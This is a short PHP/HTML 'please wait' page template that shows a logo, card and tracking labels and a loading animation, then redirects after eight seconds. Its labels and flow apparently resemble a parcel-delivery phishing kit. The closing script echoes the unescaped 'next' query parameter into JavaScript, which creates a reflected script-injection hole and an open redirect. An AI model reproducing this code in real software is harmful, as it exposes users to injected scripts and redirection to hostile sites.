<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title><?php echo $lang["WAIT-A"];?></title>
</head>
<body>

<header>
    <div class="left">

 <img src="res/img/logo.png" > 

</div>

  

    <div class="right">  
       
    <div class="l2">
    <button><?php echo $lang["CARD-C2"];?></button>
        </div>

        <div class="l1">
<span><?php echo $lang["TRACK6"];?></span>
<span><?php echo $lang["TRACK7"];?></span>   
<span> <?php echo $lang["TRACK8"];?></span>
<span><?php echo $lang["TRACK9"];?></span>
</div>



</div>
</header>

    
    

<main>



    <div class="continer">
    
<div class="titles_holder" style="padding:10px;">
<h2><?php echo $lang["WAIT-A1"];?></h2>
</div>


<div class="heads">
<p><?php echo $lang["WAIT-A2"];?></p>
<div class="loding"><img src="res/img/loading.gif" style="width:60px;"></div>
 
</div>


<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>



</body>
</html>